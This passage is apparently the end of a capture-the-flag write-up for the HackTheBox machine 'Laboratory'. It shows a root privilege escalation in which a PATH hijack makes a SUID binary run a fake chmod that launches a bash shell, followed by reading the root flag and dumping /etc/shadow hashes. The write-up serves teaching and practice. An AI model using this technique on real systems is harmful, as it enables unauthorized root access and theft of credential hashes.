2020 /usr/bin/passwd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The unusual <code>/usr/local/bin/docker-security</code> immediately trigger an alarm.</p><p>Looking at the binary we can find some strings:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">chmod 700 /usr/bin/docker</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chmod 660 /var/run/docker.sock</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>chmod</code> is not called with an absolute path so we&#x27;ll be able to abuse it.</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">dexter@laboratory:~$ TF=$(mktemp -d)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dexter@laboratory:~$ printf %s &#x27;/bin/bash -i&#x27; &gt; $TF/chmod</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dexter@laboratory:~$ chmod +x $TF/chmod</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dexter@laboratory:~$ export PATH=$TF:$PATH</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dexter@laboratory:~$ /usr/local/bin/docker-security</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@laboratory:~# id</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uid=0(root) gid=0(root) groups=0(root),1000(dexter)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@laboratory:~# cat /root/root.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ef0e8347aa9f24a62f03cafcdde43015</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@laboratory:~# grep &#x27;$6&#x27; /etc/shadow</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root:$6$AMvgOmRCNzBloX3T$rd5nRPwkBPHenf6VLHfsXb066LNq0MZBRYeEsuCZviD8nQGvVLMaW9iH1hb5FPHzdl.McOJ8GrFIFfdSnIo4t1:18439:0:99999:7:::</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dexter:$6$eAUP4RwbH.7dC8vD$yt76SKVuEpKOgpp0D8r5YiYeB7edojKVHWoaNIDqk5JIvLD0t9n/jRL4v2FJH30s/ui2PymaXCKEvS38f2wKk1:18439:0:99999:7:::</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-tags-row row margin-bottom--sm"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/security/">security</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/writeups/">writeups</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/htb/">htb</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/pe/">pe</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/linux/">linux</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/web/">web</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/rce/">rce</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/ruby/">ruby</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/git/">git</a></li></ul></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/writeups/HackTheBox/Jewel/write-up/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Jewel </div></a><a class="pagination-nav__link pagination-nav__link--next" href="/writeups/HackTheBox/Magic/write-up/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Magic </div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#overview" class="table-of-contents__link toc-highlight">Overview</a></li><li><a href="#network-enumeration" class="table-of-contents__link toc-highlight">Network enumeration</a></li><li><a href="#web-discovery--enumeration" class="table-of-contents__link toc-highlight">Web discovery &amp; enumeration</a></li><li><a href="#privilege-escalation-of-machine--from-git-container-to-dexter-host" class="table-of-contents__link toc-highlight">Privilege Escalation of Machine : from git (container) to dexter (host)</a></li><li><a href="#privilege-escalation-of-machine--from-dexter-host-to-root-host" class="table-of-contents__link toc-highlight">Privilege Escalation of Machine : from dexter (host) to root (host)</a></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Support me</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/sponsors/S4CH" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Made with   ♥  by CyFun © 2023 
                            | Built on Docusaurus</div></div></div></footer></div>
<script src="/assets/js/runtime~main.3415e7ae.js"></script>
<script src="/assets/js/main.c90fa39a.js"></script>
</body>
</html>